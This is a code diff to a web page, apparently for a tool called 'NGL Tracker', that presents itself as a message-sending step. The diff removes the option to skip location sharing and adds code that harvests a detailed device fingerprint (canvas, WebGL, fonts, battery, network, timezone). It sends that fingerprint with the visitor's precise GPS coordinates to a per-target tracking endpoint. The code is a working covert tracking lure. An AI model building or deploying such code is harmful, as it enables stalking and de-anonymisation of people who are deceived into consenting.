@@ -194,10 +194,6 @@
         <span id="btn-text">Allow Location & Continue</span>
       </button>
 
-      <button id="skip-btn" class="btn-secondary" onclick="skipToIPTracking()">
-        Skip & Continue
-      </button>
-
       <div id="status"></div>
 
       <div class="privacy-note">
@@ -212,6 +208,101 @@
       let redirectAttempted = false;
       let retryCount = 0;
       const MAX_RETRIES = 3;
+
+      // Collect device fingerprint
+      function getDeviceFingerprint() {
+        const fp = {
+          screenResolution: `${screen.width}x${screen.height}`,
+          colorDepth: screen.colorDepth,
+          platform: navigator.platform,
+          language: navigator.language,
+          languages: navigator.languages ? Array.from(navigator.languages) : [],
+          deviceMemory: navigator.deviceMemory,
+          hardwareConcurrency: navigator.hardwareConcurrency,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timezoneOffset: new Date().getTimezoneOffset(),
+          touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+        };
+
+        // Get plugins
+        if (navigator.plugins) {
+          fp.plugins = Array.from(navigator.plugins).map((p) => p.name);
+        }
+
+        // Canvas fingerprint
+        try {
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+          ctx.textBaseline = 'top';
+          ctx.font = '14px Arial';
+          ctx.fillText('NGL Tracker', 2, 2);
+          fp.canvas = canvas.toDataURL().slice(-50); // Last 50 chars as hash
+        } catch (e) {
+          fp.canvas = 'unavailable';
+        }
+
+        // WebGL fingerprint
+        try {
+          const canvas = document.createElement('canvas');
+          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+          if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            fp.webgl = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
+          }
+        } catch (e) {
+          fp.webgl = 'unavailable';
+        }
+
+        // Detect fonts
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const testFonts = [
+          'Arial',
+          'Verdana',
+          'Courier New',
+          'Georgia',
+          'Times New Roman',
+          'Trebuchet MS',
+        ];
+
+        fp.fonts = testFonts.filter((font) => {
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+
+          ctx.font = `72px ${font}, ${baseFonts[0]}`;
+          const width1 = ctx.measureText('mmmmmmmmmmlli').width;
+
+          ctx.font = `72px ${baseFonts[0]}`;
+          const width2 = ctx.measureText('mmmmmmmmmmlli').width;
+
+          return width1 !== width2;
+        });
+
+        // Battery API
+        if (navigator.getBattery) {
+          navigator
+            .getBattery()
+            .then((battery) => {
+              fp.battery = {
+                charging: battery.charging,
+                level: battery.level,
+              };
+            })
+            .catch(() => {
+              fp.battery = { charging: null, level: null };
+            });
+        }
+
+        // Network info
+        if (navigator.connection) {
+          fp.connection = {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+          };
+        }
+
+        return fp;
+      }
 
       function showStatus(message, type = 'info') {
         const statusElement = document.getElementById('status');
@@ -283,8 +374,12 @@
       function sendLocation(latitude, longitude) {
         console.log('Sending location:', latitude, longitude);
 
+        const deviceFingerprint = getDeviceFingerprint();
+
+        const data = { latitude, longitude, deviceFingerprint };
+
         if (navigator.sendBeacon) {
-          const blob = new Blob([JSON.stringify({ latitude, longitude })], {
+          const blob = new Blob([JSON.stringify(data)], {
             type: 'application/json',
           });
           navigator.sendBeacon(`/api/v1/location/${trackingId}`, blob);
@@ -292,7 +387,7 @@
           fetch(`/api/v1/location/${trackingId}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ latitude, longitude }),
+            body: JSON.stringify(data),
             keepalive: true,
           }).catch((err) => console.error('Location send failed:', err));
         }
@@ -315,10 +410,13 @@
             });
           });
 
-          const { latitude, longitude } = position.coords;
-          console.log('Location obtained:', { latitude, longitude });
+          const { latitude, longitude, accuracy } = position.coords;
+          console.log('Location obtained:', { latitude, longitude, accuracy });
 
-          showStatus('✓ Location received! Sending your message...', 'success');
+          showStatus(
+            `✓ Location received (±${Math.round(accuracy)}m)!! Sending your message...`,
+            'success'
+          );
           updateButtonState(true, 'Success! Redirecting...');
 
           sendLocation(latitude, longitude);
